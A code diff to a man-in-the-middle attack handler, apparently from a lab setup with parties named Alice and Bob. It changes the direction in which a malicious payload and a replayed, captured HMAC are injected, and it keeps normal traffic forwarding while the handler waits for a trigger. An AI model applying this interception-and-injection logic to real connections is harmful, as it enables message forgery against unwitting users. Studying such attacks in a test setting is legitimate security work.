@@ -276,14 +276,15 @@ class MitmAttackHandler:
         # After handshake, inject malicious payload with captured HMAC
         elif (self.global_state.state['active'] and 
               self.global_state.state['phase'] == 'ready_for_injection'):
-            # Only inject in alice_to_bob direction (Alice -> Bob) so Alice receives the payload
-            if (correct_direction == 'alice_to_bob' and 
+            
+            # Always forward messages normally in this phase, but check for injection trigger
+            if (correct_direction == 'bob_to_alice' and 
                 not self.global_state.state['injected'] and 
                 self.global_state.state['stored_hmac']):
                 
                 # Check if we should inject based on the current message action
                 should_inject = False
-                injection_trigger = self.payload_handler.get_injection_trigger("alice_to_bob")
+                injection_trigger = self.payload_handler.get_injection_trigger("bob_to_alice")
                 
                 if injection_trigger and isinstance(raw_msg, dict):
                     # Check if this message contains the trigger action
@@ -328,12 +329,6 @@ class MitmAttackHandler:
                             message_length = len(message_content)
                             length_header = message_length.to_bytes(4, byteorder='big')
                             malicious_package = length_header + message_content
-                    else:
-                        # No malicious payload, just send HMAC with proper header
-                        message_content = self.global_state.state['stored_hmac']
-                        message_length = len(message_content)
-                        length_header = message_length.to_bytes(4, byteorder='big')
-                        malicious_package = length_header + message_content
                     
                     writer.write(malicious_package)
                     await writer.drain()
@@ -344,6 +339,9 @@ class MitmAttackHandler:
                     # Log that we're waiting for the trigger action
                     if isinstance(raw_msg, dict) and 'action' in raw_msg:
                         logging.info(f"[MITM] Waiting for injection trigger '{injection_trigger}', current action: '{raw_msg['action']}'")
+            
+            # Always return True to forward messages normally in this phase
+            # This ensures Bob's responses reach Alice while we wait for the injection trigger
             return True
             
         # If we're in attack mode but haven't seen a challenge yet, just forward normally
